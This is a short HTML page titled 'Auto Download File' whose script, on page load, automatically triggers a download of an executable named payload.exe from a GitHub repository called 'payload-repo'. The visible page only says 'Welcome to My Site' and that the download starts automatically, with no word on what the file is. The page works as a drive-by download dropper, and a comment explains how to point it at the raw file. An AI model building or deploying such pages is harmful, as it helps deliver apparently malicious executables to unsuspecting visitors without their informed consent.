<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Download File</title>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            var link = document.createElement('a');
            link.href = 'https://github.com/YoleeR12/payload-repo/blob/main/payload.exe'; // Update this URL to the raw file link in your repository
            link.download = 'payload.exe'; // The name of the file to be downloaded
            link.click();
        });
    </script>
</head>
<body>
    <h1>Welcome to My Site</h1>
    <p>Your download should start automatically.</p>
</body>
</html>
